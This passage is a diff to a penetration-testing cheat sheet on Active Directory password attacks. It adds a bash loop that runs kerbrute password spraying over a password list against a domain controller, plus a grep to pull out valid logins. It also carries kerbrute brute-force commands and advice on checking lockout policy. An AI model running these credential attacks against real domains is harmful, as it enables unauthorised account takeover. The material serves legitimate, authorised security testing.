@@ -551,11 +551,19 @@ kerbrute bruteuser --dc 10.10.10.10 -d <domain> '<passwords.txt>' '<user>'
 ```
 
 #### Password spraying
+
 ```
 kerbrute passwordspray --dc 10.10.10.10 -d <domain> '<user.txt>' <password>
 ```
+Use the following one-liner to perform a password spraying attack using a list of passwords:  
+```
+for pass in $(cat passwords.txt); do kerbrute passwordspray --dc <dc_ip_fqdn> -d '<domain>' '<users.txt>' $pass -o kerbrute_$RANDOM; done
+```
+> The command above will save the output in random filenames that are prefixed by `kerbrute_XXXX`
+Once the attack done, you can use `grep 'VALID LOGIN' kerbrute_*` to search for valid credentials
 
 #### Read username:password combos from a file or stdin and test them
+
 ```
 cat <userpass.txt> | kerbrute bruteforce --dc 10.10.10.10 -d <domain> -
 ```
@@ -565,6 +573,7 @@ cat <userpass.txt> | kerbrute bruteforce --dc 10.10.10.10 -d <domain> -
 Here are some good practices to take into consideration when conducting a password guessing attack.
 
 ### Enumerate the password policy
+
 Enumerating the domain password policy before starting any password attack is always a good practice. <br>
 For instance, during internal penetration testing, you can enumerate the domain password policy using [nxc smb's --pass-pol](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-domain-password-policy-1) option. <br>
 Doing that can help you adapt your password guessing attack (reduce the size of our wordlist) and avoid locking out accounts. Some important fields that we will look when enumerating the domain password policy include :
